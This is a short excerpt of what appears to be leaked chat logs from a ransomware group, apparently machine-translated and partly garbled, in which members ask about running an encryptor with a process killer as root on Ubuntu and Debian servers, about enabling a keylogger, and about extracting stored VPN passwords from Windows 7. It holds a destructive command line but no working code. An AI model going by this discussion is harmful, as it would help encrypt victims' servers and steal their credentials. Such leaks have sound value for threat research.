+Message: @all
+people , anyone locale niks servers (ubuntu, debian)
+if you give a command
+./encryptor --path / --prockiller
+from under the root
+then the entire server will crash, along with system files (passwd, shadow, sshd as an example), will SQL, Apache and other services actually slow down and their locale and server will become unavailable?
+
+Date: 2021-11-01T17:11:19.103Z
+From: turner
+Message: @all
+brothers and sisters, does anyone have any experience of locking nixes?
+namely nix servers (ubuntu, debian)
+have a couple of questions
+
+Date: 2021-11-13T23:56:42.680Z
+From: eldorado
+Message: there is also a logmei on the wheelbarrow
+
+Date: 2021-11-13T23:45:01.460Z
+From: eldorado
+Message: there are a number of questions on how to enable the keylogger. where in wines 7 passwords from vpn connections are stored. serts dragged away, it is necessary to pick up passwords and is it possible?
